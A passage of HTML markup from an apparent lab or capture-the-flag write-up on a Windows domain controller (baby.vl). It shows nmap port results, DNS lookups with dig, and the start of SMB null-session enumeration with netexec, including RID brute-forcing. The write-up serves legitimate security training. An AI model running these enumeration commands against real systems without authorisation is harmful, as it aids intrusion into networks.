style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">13\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">3389/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ms-wbt-server\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Terminal\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Services\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">14\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">5985/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">http\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">          \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">HTTPAPI\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">httpd\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2.0\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> (SSDP/UPnP)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">15\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">49664/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">16\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">49669/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">17\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">52764/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ncacn_http\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">over\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">HTTP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">1.0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">18\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">52765/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">19\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">52774/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">20\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">55156/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">21\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Service\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Info:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Host:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">; \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">OS:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">; \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">CPE:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">cpe:/o:microsoft:windows\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We see we are facing a \u003Cem>DC\u003C/em> (Domain Controller) because of the open ports like \u003Ccode>53 TCP (DNS)\u003C/code> \u003Ccode>88 TCP (Kerberos)\u003C/code> \u003Ccode>389 TCP (LDAP)\u003C/code> \u003C/p>\u003Cp>We can already see the domain using \u003Ccode>netexec\u003C/code> so we can add it to our \u003Ccode>/etc/hosts\u003C/code> file\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:151ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">netexec\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">smb\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> $TARGET\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [*] Windows Server 2022 Build 20348 x64 (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">name:BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">domain:baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">signing:True\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMBv1:False\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Let’s start off by enumerating \u003Cem>DNS\u003C/em> using \u003Ccode>dig\u003C/code> \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:41ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">dig\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">@\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">$TARGET \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">NS\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">baby.vl.\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">3600\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">IN\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">NS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">babydc.baby.vl.\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We can see also the \u003Cem>fully qualified domain\u003C/em> name of the \u003Ccode>DC\u003C/code> \u003C/p>\u003Cp>Now let’s enumerate \u003Ccode>SMB\u003C/code> on the target machine using a \u003Cem>NULL Session\u003C/em> in \u003Ccode>netexec\u003C/code>  \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:240ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">netexec\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">smb\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">babydc.baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--users\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--shares\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--rid-brute\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [*] Windows Server 2022 Build 20348 x64 (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">name:BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan 